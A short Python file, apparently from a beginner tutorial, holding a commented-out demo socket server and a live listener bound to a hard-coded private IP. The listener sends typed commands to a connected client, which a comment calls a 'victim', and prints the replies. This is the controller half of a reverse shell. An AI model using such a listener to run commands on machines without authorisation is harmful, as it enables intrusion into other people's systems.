# # first of all import the socket library
# import socket
#
# # next create a socket object
# s = socket.socket()
# print("Socket successfully created")
#
# # reserve a port on your computer in our
# # case it is 12345 but it can be anything
# port = 12345
#
# # Next bind to the port
# # we have not typed any ip in the ip field
# # instead we have inputted an empty string
# # this makes the server listen to requests
# # coming from other computers on the network
# s.bind(('', port))
# print(f"socket bound to {port}")
#
# # put the socket into listening mode
# s.listen(5)
# print("socket is listening")
#
# # a forever loop until we interrupt it or
# # an error occurs
#
# while True:
#     # Establish connection with client.
#     c, addr = s.accept()
#     print('Got connection from', addr)
#
#     # send a thank you message to the client.
#     c.send(b'Thank you for connecting')
#
# # Close the connection with the client
# c.close()
import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.43.192"
        port = 57669
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands to client/victim or a friend

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
